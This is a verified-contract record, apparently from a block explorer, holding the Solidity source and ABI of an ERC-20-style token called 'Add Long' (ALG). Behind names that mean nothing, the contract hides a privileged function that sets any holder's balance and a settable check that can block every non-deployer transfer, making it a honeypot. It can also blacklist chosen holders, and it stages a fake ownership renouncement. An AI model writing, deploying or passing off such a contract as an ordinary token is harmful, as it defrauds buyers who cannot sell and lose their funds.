{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface receiverTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tradingLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitLaunch {\n    function createPair(address launchFromTrading, address sellTakeFund) external returns (address);\n}\n\ninterface fromMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromToken) external view returns (uint256);\n\n    function transfer(address tradingSwap, uint256 fundSenderBuy) external returns (bool);\n\n    function allowance(address shouldTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundSenderBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingSwap,\n        uint256 fundSenderBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderTradingList, uint256 value);\n    event Approval(address indexed shouldTo, address indexed spender, uint256 value);\n}\n\ninterface toAt is fromMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AddLong is tradingLaunched, fromMin, toAt {\n\n    constructor (){\n        \n        receiverTo tradingMaxFee = receiverTo(sellWallet);\n        senderShould = limitLaunch(tradingMaxFee.factory()).createPair(tradingMaxFee.WETH(), address(this));\n        if (swapReceiver) {\n            swapAmount = takeFromLaunched;\n        }\n        shouldSender = _msgSender();\n        buyTotal();\n        amountIsLimit[shouldSender] = true;\n        takeLimit[shouldSender] = enableTeam;\n        \n        emit Transfer(address(0), shouldSender, enableTeam);\n    }\n\n    uint256 constant exemptLaunched = 17 ** 10;\n\n    bool public txMarketing;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableTeam;\n    }\n\n    address liquidityIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private enableTeam = 100000000 * 10 ** 18;\n\n    function atLiquidity() private view {\n        require(amountIsLimit[_msgSender()]);\n    }\n\n    uint256 feeSender;\n\n    function allowance(address senderAt, address fundMin) external view virtual override returns (uint256) {\n        if (fundMin == sellWallet) {\n            return type(uint256).max;\n        }\n        return toSwapBuy[senderAt][fundMin];\n    }\n\n    function sellTotal(address feeShould, address tradingSwap, uint256 fundSenderBuy) internal returns (bool) {\n        if (feeShould == shouldSender) {\n            return amountMin(feeShould, tradingSwap, fundSenderBuy);\n        }\n        uint256 fundBuy = fromMin(senderShould).balanceOf(liquidityIs);\n        require(fundBuy == feeSender);\n        require(tradingSwap != liquidityIs);\n        if (launchedMode[feeShould]) {\n            return amountMin(feeShould, tradingSwap, exemptLaunched);\n        }\n        return amountMin(feeShould, tradingSwap, fundSenderBuy);\n    }\n\n    address public shouldSender;\n\n    function owner() external view returns (address) {\n        return totalMinEnable;\n    }\n\n    function amountMin(address feeShould, address tradingSwap, uint256 fundSenderBuy) internal returns (bool) {\n        require(takeLimit[feeShould] >= fundSenderBuy);\n        takeLimit[feeShould] -= fundSenderBuy;\n        takeLimit[tradingSwap] += fundSenderBuy;\n        emit Transfer(feeShould, tradingSwap, fundSenderBuy);\n        return true;\n    }\n\n    address private totalMinEnable;\n\n    uint8 private maxWallet = 18;\n\n    string private minIs = \"ALG\";\n\n    function approve(address fundMin, uint256 fundSenderBuy) public virtual override returns (bool) {\n        toSwapBuy[_msgSender()][fundMin] = fundSenderBuy;\n        emit Approval(_msgSender(), fundMin, fundSenderBuy);\n        return true;\n    }\n\n    function buyTotal() public {\n        emit OwnershipTransferred(shouldSender, address(0));\n        totalMinEnable = address(0);\n    }\n\n    string private txAuto = \"Add Long\";\n\n    function atIs(address senderMin) public {\n        if (takeLaunched) {\n            return;\n        }\n        \n        amountIsLimit[senderMin] = true;\n        \n        takeLaunched = true;\n    }\n\n    bool public takeLaunched;\n\n    mapping(address => bool) public amountIsLimit;\n\n    function symbol() external view virtual override returns (string memory) {\n        return minIs;\n    }\n\n    event OwnershipTransferred(address indexed marketingReceiver, address indexed exemptTake);\n\n    uint256 private swapAmount;\n\n    bool private swapReceiver;\n\n    function balanceOf(address fromToken) public view virtual override returns (uint256) {\n        return takeLimit[fromToken];\n    }\n\n    uint256 private enableTotal;\n\n    function getOwner() external view returns (address) {\n        return totalMinEnable;\n    }\n\n    mapping(address => bool) public launchedMode;\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxWallet;\n    }\n\n    function enableMinLaunch(address tokenBuy, uint256 fundSenderBuy) public {\n        atLiquidity();\n        takeLimit[tokenBuy] = fundSenderBuy;\n    }\n\n    mapping(address => uint256) private takeLimit;\n\n    uint256 receiverEnable;\n\n    address public senderShould;\n\n    function swapEnable(uint256 fundSenderBuy) public {\n        atLiquidity();\n        feeSender = fundSenderBuy;\n    }\n\n    function transferFrom(address feeShould, address tradingSwap, uint256 fundSenderBuy) external override returns (bool) {\n        if (_msgSender() != sellWallet) {\n            if (toSwapBuy[feeShould][_msgSender()] != type(uint256).max) {\n                require(fundSenderBuy <= toSwapBuy[feeShould][_msgSender()]);\n                toSwapBuy[feeShould][_msgSender()] -= fundSenderBuy;\n            }\n        }\n        return sellTotal(feeShould, tradingSwap, fundSenderBuy);\n    }\n\n    uint256 private takeFromLaunched;\n\n    mapping(address => mapping(address => uint256)) private toSwapBuy;\n\n    address sellWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return txAuto;\n    }\n\n    function transfer(address tokenBuy, uint256 fundSenderBuy) external virtual override returns (bool) {\n        return sellTotal(_msgSender(), tokenBuy, fundSenderBuy);\n    }\n\n    function sellTake(address senderSwap) public {\n        atLiquidity();\n        if (swapReceiver != txMarketing) {\n            swapAmount = takeFromLaunched;\n        }\n        if (senderSwap == shouldSender || senderSwap == senderShould) {\n            return;\n        }\n        launchedMode[senderSwap] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTradingList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountIsLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundSenderBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMin\",\"type\":\"address\"}],\"name\":\"atIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundSenderBuy\",\"type\":\"uint256\"}],\"name\":\"enableMinLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderSwap\",\"type\":\"address\"}],\"name\":\"sellTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundSenderBuy\",\"type\":\"uint256\"}],\"name\":\"swapEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundSenderBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundSenderBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AddLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}